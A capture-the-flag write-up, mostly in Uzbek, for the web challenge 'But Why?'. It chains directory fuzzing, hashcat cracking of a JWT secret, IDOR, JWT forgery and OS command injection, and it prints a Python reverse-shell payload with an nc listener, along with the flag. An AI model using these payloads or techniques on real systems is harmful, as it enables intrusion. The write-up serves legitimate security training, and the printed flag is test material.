# But Why?

| Field | Value |
|-------|-------|
| Category | Web |
| Points | ? |

## Description

> (Challenge description unavailable — provided to players via CTFd.)
>
> A web application with multiple chained vulnerabilities.

## Solution

# CTF Writeup: But Why?

> **Kategoriya:** Web  
> **Qiyinlik:** Medium  

---

## Umumiy Ko'rinish

Bu challenge bir nechta zaifliklarni o'z ichiga oladi:
- Directory fuzzing orqali maxfiy ma'lumotlarni topish
- JWT token brute-force
- IDOR (Insecure Direct Object Reference)
- JWT forgery (soxtalashtirish)
- OS Command Injection → Reverse Shell

---

<img width="1683" height="924" alt="1" src="https://github.com/user-attachments/assets/dc507bd7-180f-493d-a055-82005a0ff111" />

## 1. Reconnaissance — Directory Fuzzing

Birinchi qadam sifatida saytda yashirin fayllarni topish uchun `gobuster` dan foydalanamiz:

```bash
gobuster dir -u http://192.168.68.178/ -w /usr/share/wordlists/dirb/common.txt -x txt
```

**Natija:** `note.txt` fayli topildi. Faylni analiz qilish natijasida quyidagi ma'lumotlar aniqlandi:

- **Username:** `turandev`
- **Password:** `turandev!@#`

Ushbu credentials yordamida veb saytga muvaffaqiyatli autentifikatsiyadan o'tdik.

<img width="599" height="321" alt="2" src="https://github.com/user-attachments/assets/c9edad79-a1f8-4ea9-a081-929b240bb778" />

---

## 2. Dashboard — Cheklangan Ruxsatlar (Privilege Issue)

Dashboard'da Pingvinga xabar yuborish funksiyasi mavjudligi aniqlandi. Biroq, joriy foydalanuvchimizning (`turandev`) huquqlari yetarli emas — bu funksiya faqat yuqori roli bo'lgan foydalanuvchilar uchun ochiq.

**Maqsad:** Yuqori huquqli foydalanuvchi sifatida tizimga kirish.

<img width="1688" height="930" alt="3" src="https://github.com/user-attachments/assets/0bf85fe9-d8e6-40f3-80d6-cf1791f800eb" />

---

## 3. JWT Token Brute-Force

Brauzerning `localStorage`-dan JWT token olindi. Tokenni `hashcat` yordamida brute-force qilamiz:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Natija:** JWT ning `secret key` muvaffaqiyatli topildi.

<img width="1643" height="673" alt="4" src="https://github.com/user-attachments/assets/083a3e78-f668-4d86-8ecb-3470aac1c09d" />
<img width="1656" height="541" alt="5" src="https://github.com/user-attachments/assets/a7173bff-7b5e-4fa5-ba3a-89e4b08309b0" />

---

## 4. JWT Payload — MD5 Hash Cracking

JWT payload ichidagi `user_id` maydoni MD5 hash ekanligini aniqladik. Uni `CrackStation` yordamida crack qildik:

🔗 [https://crackstation.net/](https://crackstation.net/)

**Natija:** Foydalanuvchi ID si ochiq ko'rinishda (plaintext) olindi.

<img width="1093" height="360" alt="6" src="https://github.com/user-attachments/assets/19b29336-3611-4b28-96b1-46a42a15bd08" />

---

## 5. IDOR — `/me` Endpoint orqali Boshqa Foydalanuvchilarning Ma'lumotlari

Fuzzing jarayonida `/me` endpointi topildi. Ushbu endpoint'ga `user_id` parametrini MD5 hash ko'rinishida yuborishda **IDOR zaiflikni** aniqladik — ya'ni boshqa foydalanuvchilarning ma'lumotlarini ham olish mumkin:

```
GET /me?user_id=<md5_hash>
```

Javoblar o'rganilganda **roli `manager`** bo'lgan `NavkarX` foydalanuvchisi aniqlandi.

<img width="1066" height="367" alt="7" src="https://github.com/user-attachments/assets/a41c81cd-b27b-483c-abb6-fe42b8b9e5f1" />

---

## 6. JWT Forgery — Manager Tokenini Yaratish

Bizda JWT ning `secret key` mavjud bo'lganligi uchun `NavkarX` (manager) foydalanuvchisi uchun yangi JWT token yasadik:

🔗 [https://supertokens.com/jwt-encoder-decoder](https://supertokens.com/jwt-encoder-decoder)

Token payload'iga `NavkarX`-ning `user_id` va `role: manager` qiymatlarini joylashtirib, secret key bilan imzoladik.

<img width="1162" height="753" alt="8" src="https://github.com/user-attachments/assets/9c69f960-f8a7-4fb8-b62c-28ce30a3c599" />

---

## 7. Manager Sifatida Kirish

Yaratilgan yangi JWT tokenni `localStorage`-ga o'rnatib, sahifani yangilaganimizda `NavkarX` foydalanuvchisi sifatida tizimga kirdik.

**Natija:** Pingvinga xabar yuborish funksiyasidan foydalanish mumkin!

<img width="1686" height="888" alt="9" src="https://github.com/user-attachments/assets/2cad418e-e43a-4fe6-830d-286853169375" />

---

## 8. OS Command Injection → Reverse Shell

Xabar yuborish maydonida **OS Command Injection** zaiflikni aniqladik. Netcat orqali listener ochib, reverse shell olamiz:

**Listener (attacker machine):**
```bash
nc -lvnp 5555
```

**Payload (input maydoniga):**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.68.178",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

**Natija:** Muvaffaqiyatli reverse shell olindi! 🎉

<img width="1681" height="927" alt="10" src="https://github.com/user-attachments/assets/6352d557-285f-426e-ad5f-e5459a9a5968" />

<img width="658" height="240" alt="11" src="https://github.com/user-attachments/assets/fdb57fdc-d873-4a7f-9815-a47e3f483630" />

---

## Attack Chain Xulosa

```
Directory Fuzzing (gobuster)
        ↓
Credentials topish (note.txt)
        ↓
Web saytga login
        ↓
JWT Token olish (localStorage)
        ↓
JWT Brute-Force (hashcat)  →  Secret Key topildi
        ↓
IDOR (/me endpoint)  →  Manager foydalanuvchisi aniqlandi
        ↓
JWT Forgery  →  Manager sifatida login
        ↓
OS Command Injection  →  Reverse Shell 🐚
```

---

*Writeup by: Turan Security | CTF: But Why?*


## Flag

`CHC{jwt_1dor_rce_full_ch4in}`
